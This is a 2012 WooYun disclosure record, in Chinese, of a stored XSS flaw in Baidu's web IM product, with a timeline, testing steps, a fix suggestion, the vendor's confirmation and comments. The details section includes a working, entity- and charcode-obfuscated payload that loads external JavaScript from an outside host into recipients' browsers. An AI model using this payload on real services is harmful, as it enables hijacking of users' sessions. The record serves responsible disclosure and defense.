{"id": 18935, "wybug_id": "wooyun-2012-07968", "wybug_title": "百度某IM通讯产品存储型XSS", "wybug_corp": "百度", "wybug_author": "gainover", "wybug_date": "2012-06-06 23:02", "wybug_open_date": "2012-07-21 23:02", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "持久型", "黑盒测试技巧", "技巧", "百度"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-21：\t细节向公众公开  简要描述： 不知道这个产品现在还有多少人在用呢？ 反正应该还是有用户群的，有用户群就有危害～～，如果 详细说明：  1. 收到百度HI的消息，就进去看消息，突然想了想，这里会不会有漏洞呢？2. 进入百度HI网页版，开了个百度的小号，进行测试。3. 首先，还是老办法，给小号发送一张图片，并打开调试工具，查看发送的那个图片。\n\n4. 同时，我们还对发送数据进行抓包。\n\n5. 可以看到上面2个图中的相同之处。 6. 由于是聊天窗口，消息肯定是采用innerHTML之类的输出，如果没过滤 &quot; &gt; 之类的，则可以对输出内容进行闭合并构造。7. 首先做一个简单的测试。 我们将POST的数据中 body参数修改如下：POST URL:http://web.im.baidu.com/message (仅列出被修改的参数)\nbody = <msg><font n=\"宋体\" s=\"10\" b=\"0\" i=\"0\" ul=\"0\" c=\"0\"/><img n=\"9BA5EC29F8\" md5=\"417a8481ac7956d21cab61af19b89a93&quot;&gt;\" t=\"png\"/></msg>（encodeURIComponent编码一下）\n说明：将md5的值末尾加了&quot;&gt;8. 可以看到我的号收到了消息，并且侧漏了！！\n\n9. 这说明，百度这里确实没有过滤，进而构造利用代码，将body参数改为以下内容。 \n<msg><font n=\"宋体\" s=\"10\" b=\"0\" i=\"0\" ul=\"0\" c=\"0\"/><img n=\"9BA5EC29F8\" md5=\"d1057ebb757b5229c4e8a2c556924b9d&#34;&#62;&#60;&#105;&#109;&#103;&#47;&#115;&#114;&#99;&#61;&#49;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#40;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#40;&#41;&#123;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#115;&#61;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#83;&#116;&#114;&#105;&#110;&#103;&#46;&#102;&#114;&#111;&#109;&#67;&#104;&#97;&#114;&#67;&#111;&#100;&#101;&#40;&#49;&#49;&#53;&#44;&#57;&#57;&#44;&#49;&#49;&#52;&#44;&#49;&#48;&#53;&#44;&#49;&#49;&#50;&#44;&#49;&#49;&#54;&#41;&#41;&#59;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#115;&#46;&#115;&#114;&#99;&#61;&#83;&#116;&#114;&#105;&#110;&#103;&#46;&#102;&#114;&#111;&#109;&#67;&#104;&#97;&#114;&#67;&#111;&#100;&#101;&#40;&#49;&#48;&#52;&#44;&#49;&#49;&#54;&#44;&#49;&#49;&#54;&#44;&#49;&#49;&#50;&#44;&#53;&#56;&#44;&#52;&#55;&#44;&#52;&#55;&#44;&#49;&#50;&#48;&#44;&#49;&#49;&#53;&#44;&#49;&#49;&#53;&#44;&#49;&#49;&#54;&#44;&#52;&#54;&#44;&#49;&#49;&#53;&#44;&#49;&#48;&#53;&#44;&#49;&#49;&#48;&#44;&#57;&#55;&#44;&#57;&#55;&#44;&#49;&#49;&#50;&#44;&#49;&#49;&#50;&#44;&#52;&#54;&#44;&#57;&#57;&#44;&#49;&#49;&#49;&#44;&#49;&#48;&#57;&#44;&#52;&#55;&#44;&#49;&#48;&#57;&#44;&#52;&#54;&#44;&#49;&#48;&#54;&#44;&#49;&#49;&#53;&#41;&#59;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#115;&#41;&#125;&#41;&#40;&#41;&#62;&#60;&#98;&#32;&#97;&#61;&#34;\" t=\"png\"/></msg>\n10. 以上测试代码，调用外部JS， 效果见漏洞证明   漏洞证明：  大号发小号： IE\n\n小号发大号：Chrome\n\n   修复方案：  输出时，将&转换为 &amp; ，同时既然是md5，字段完全可以正则进行严格控制。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-06-07 11:48 厂商回复： 感谢提交，修复中。。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-06 23:30 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  mark    \n     2012-06-06 23:32 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  = = 呀，标题变了。 “某”字无意义了。    \n     2012-06-06 23:53 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  看样子又会整个精华出来。15*2=30啊。。。    \n     2012-06-07 00:02 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @gainover 这个意义完全不一样，很赞，估计精华了    \n     2012-06-07 00:11 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  跨站师。。    \n     2012-06-07 00:24 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  百度发礼物了。    \n     2012-06-07 00:31 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  突然感觉压力好大哦。    \n     2012-06-07 00:42 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @zeracker 是因为gainover的rank搞的太快了吧，嘎嘎。对你第二名构成威胁了，嗯，啧啧    \n     2012-06-07 10:50 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xsser 嘿嘿，其实不光百度有～  另外一个网站的更好玩，还在测试中。     \n     2012-06-07 11:53 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @gainover 测试思路受益匪浅 多谢！    \n     2012-06-07 12:18 |    \t\td4rkwind \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 关注web 安全，产品安全)\t\t \n  赞    \n     2012-06-07 12:20 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  郁闷，我都看不到、、、    \n     2012-06-07 12:51 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @px1624 耐心等待    \n     2012-06-07 13:16 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xsser 很多都是从乌云学的啦。= = 刚来乌云的时候，反射型与存储型的XSS我都没分清楚    \n     2012-06-07 14:03 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @gainover 哈哈、、心里安慰啊、    \n     2012-06-16 16:04 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  附加纠正：后续研究发现，此漏洞应该与服务器端对&quot;等实体转义的转换有关，而非本人文中所猜测的由于前端输出所造成。 同样的问题，漏洞关联： WooYun: 新浪博客储存型XSS漏洞（访问就中招），可以加载任意外部js文件    \n     2012-06-16 18:48 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @gainover 哦。。和我发现的那个是一类的哦、、、    \n     2012-07-21 23:50 |    \t\t高成 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 靠不靠谱)\t\t \n  百度不就只有一个百度HI吗    \n     2012-07-30 04:14 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @gainover  \"很多都是从乌云学的啦。= = 刚来乌云的时候，反射型与存储型的XSS我都没分清楚\"gainover 好励志啊!跟你学习哈    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}